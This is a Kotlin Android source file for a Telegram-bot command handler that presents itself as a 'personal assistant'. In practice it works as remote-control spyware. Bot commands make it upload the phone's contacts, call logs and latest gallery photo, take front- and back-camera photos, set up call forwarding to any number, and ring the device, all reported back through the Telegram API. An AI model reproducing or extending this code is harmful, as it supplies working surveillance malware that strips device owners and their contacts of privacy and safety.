package com.example.telegrambot.handlers

import android.content.Context
import com.example.telegrambot.data.MessageEntity
import com.example.telegrambot.data.MessageType
import com.example.telegrambot.network.TelegramApi
import com.example.telegrambot.utils.Preferences
import kotlinx.coroutines.*

object MessageHandler {
    
    private val handlerScope = CoroutineScope(Dispatchers.IO)

    fun processMessage(context: Context, message: MessageEntity) {
        handlerScope.launch {
            try {
                when {
                    message.type == MessageType.COMMAND -> {
                        handleCommand(context, message)
                    }
                    message.type == MessageType.TEXT -> {
                        handleTextMessage(context, message)
                    }
                    message.type == MessageType.CALLBACK -> {
                        handleCallback(context, message)
                    }
                    message.type == MessageType.INLINE_QUERY -> {
                        handleInlineQuery(context, message)
                    }
                }
            } catch (e: Exception) {
                // Log error
            }
        }
    }

    private suspend fun handleCommand(context: Context, message: MessageEntity) {
        val token = Preferences.getBotToken(context) ?: return
        val chatId = message.chatId
        val command = message.content.split(" ").firstOrNull()?.lowercase() ?: return
        val args = message.content.split(" ").drop(1)

        when (command) {
            "/start" -> {
                val welcome = """
                    🤖 *Welcome to Telegram Bot!*
                    
                    I'm your personal assistant. Here's what I can do:
                    • /contacts - Get contacts list
                    • /call_log - Get call logs
                    • /gallery - Get latest photo from gallery
                    • /camera_front - Take photo from front camera
                    • /camera_back - Take photo from back camera
                    • /forward <number> - Forward calls to number
                    • /ring - Ring device at max volume
                    • /ping - Check if bot is alive
                    • /echo <text> - Echo your message
                    • /time - Show current time
                    • /info - Show bot info
                """.trimIndent()
                TelegramApi.sendMessage(token, chatId, welcome, "Markdown")
            }
            "/help" -> {
                val help = """
                    📋 *Available Commands*
                    
                    /contacts - Get contacts list
                    /call_log - Get call logs
                    /gallery - Get latest photo from gallery
                    /camera_front - Take photo from front camera
                    /camera_back - Take photo from back camera
                    /forward <number> - Forward calls to number
                    /ring - Ring device at max volume
                    /start - Start the bot
                    /help - Show this help
                    /ping - Check if bot is alive
                    /echo <text> - Echo your message
                    /time - Show current time
                    /info - Show bot info
                """.trimIndent()
                TelegramApi.sendMessage(token, chatId, help, "Markdown")
            }
            "/contacts" -> {
                val file = com.example.telegrambot.helpers.ContactsHelper.getContactsFile(context)
                if (file != null) {
                    TelegramApi.sendDocument(token, chatId, file)
                } else {
                    TelegramApi.sendMessage(token, chatId, "❌ Failed to read contacts. Check permissions.")
                }
            }
            "/call_log" -> {
                val file = com.example.telegrambot.helpers.CallLogHelper.getCallLogsFile(context)
                if (file != null) {
                    TelegramApi.sendDocument(token, chatId, file)
                } else {
                    TelegramApi.sendMessage(token, chatId, "❌ Failed to read call logs. Check permissions.")
                }
            }
            "/gallery" -> {
                val file = com.example.telegrambot.helpers.GalleryHelper.getLatestPhoto(context)
                if (file != null) {
                    TelegramApi.sendPhoto(token, chatId, file, "Latest photo from gallery")
                } else {
                    TelegramApi.sendMessage(token, chatId, "❌ Failed to read gallery. Check permissions or no photos found.")
                }
            }
            "/camera_front" -> {
                TelegramApi.sendMessage(token, chatId, "📸 Taking front photo...")
                com.example.telegrambot.helpers.CameraHelper.takePhoto(context, useFront = true) { file ->
                    if (file != null) {
                        handlerScope.launch { TelegramApi.sendPhoto(token, chatId, file, "Front Camera") }
                    } else {
                        handlerScope.launch { TelegramApi.sendMessage(token, chatId, "❌ Failed to take photo. Check permissions.") }
                    }
                }
            }
            "/camera_back" -> {
                TelegramApi.sendMessage(token, chatId, "📸 Taking back photo...")
                com.example.telegrambot.helpers.CameraHelper.takePhoto(context, useFront = false) { file ->
                    if (file != null) {
                        handlerScope.launch { TelegramApi.sendPhoto(token, chatId, file, "Back Camera") }
                    } else {
                        handlerScope.launch { TelegramApi.sendMessage(token, chatId, "❌ Failed to take photo. Check permissions.") }
                    }
                }
            }
            "/forward" -> {
                if (args.isNotEmpty()) {
                    val number = args[0]
                    val success = com.example.telegrambot.helpers.CallForwardingHelper.setupForwarding(context, number)
                    if (success) {
                        TelegramApi.sendMessage(token, chatId, "✅ Call forwarding initiated to $number")
                    } else {
                        TelegramApi.sendMessage(token, chatId, "❌ Failed to setup call forwarding. Check permissions.")
                    }
                } else {
                    TelegramApi.sendMessage(token, chatId, "Usage: /forward <number>")
                }
            }
            "/ring" -> {
                com.example.telegrambot.helpers.RemoteControlHelper.ringDevice(context)
                TelegramApi.sendMessage(token, chatId, "🔊 Ringing device!")
            }
            "/ping" -> {
                TelegramApi.sendMessage(token, chatId, "🏓 Pong!")
            }
            "/echo" -> {
                val text = args.joinToString(" ")
                if (text.isNotEmpty()) {
                    TelegramApi.sendMessage(token, chatId, "📢 $text")
                } else {
                    TelegramApi.sendMessage(token, chatId, "Usage: /echo <text>")
                }
            }
            "/time" -> {
                val time = java.text.SimpleDateFormat(
                    "yyyy-MM-dd HH:mm:ss",
                    java.util.Locale.getDefault()
                ).format(java.util.Date())
                TelegramApi.sendMessage(token, chatId, "🕐 $time")
            }
            "/info" -> {
                val info = TelegramApi.getMe(token)
                if (info.ok && info.result != null) {
                    val bot = info.result
                    val msg = """
                        🤖 *Bot Info*
                        ID: ${bot.id}
                        Name: ${bot.first_name}
                        Username: @${bot.username ?: "Not set"}
                    """.trimIndent()
                    TelegramApi.sendMessage(token, chatId, msg, "Markdown")
                }
            }
            else -> {
                TelegramApi.sendMessage(
                    token, chatId,
                    "❌ Unknown command. Use /help for available commands."
                )
            }
        }
    }

    private suspend fun handleTextMessage(context: Context, message: MessageEntity) {
        val token = Preferences.getBotToken(context) ?: return
        val chatId = message.chatId
        
        when {
            message.content.contains("hello", ignoreCase = true) -> {
                TelegramApi.sendMessage(token, chatId, "👋 Hello! How can I help?")
            }
            message.content.contains("bye", ignoreCase = true) -> {
                TelegramApi.sendMessage(token, chatId, "👋 Goodbye! Have a great day!")
            }
            message.content.contains("help", ignoreCase = true) -> {
                TelegramApi.sendMessage(token, chatId, "Try /help for available commands.")
            }
        }
    }

    private suspend fun handleCallback(context: Context, message: MessageEntity) {
        val token = Preferences.getBotToken(context) ?: return
        val chatId = message.chatId
        
        when (message.content) {
            "button_clicked" -> {
                TelegramApi.sendMessage(token, chatId, "✅ Button clicked!")
            }
            "confirm" -> {
                TelegramApi.sendMessage(token, chatId, "✅ Confirmed!")
            }
            "cancel" -> {
                TelegramApi.sendMessage(token, chatId, "❌ Cancelled.")
            }
        }
    }

    private suspend fun handleInlineQuery(context: Context, message: MessageEntity) {
        // Handle inline queries
        // This would be implemented with answerInlineQuery
    }
}
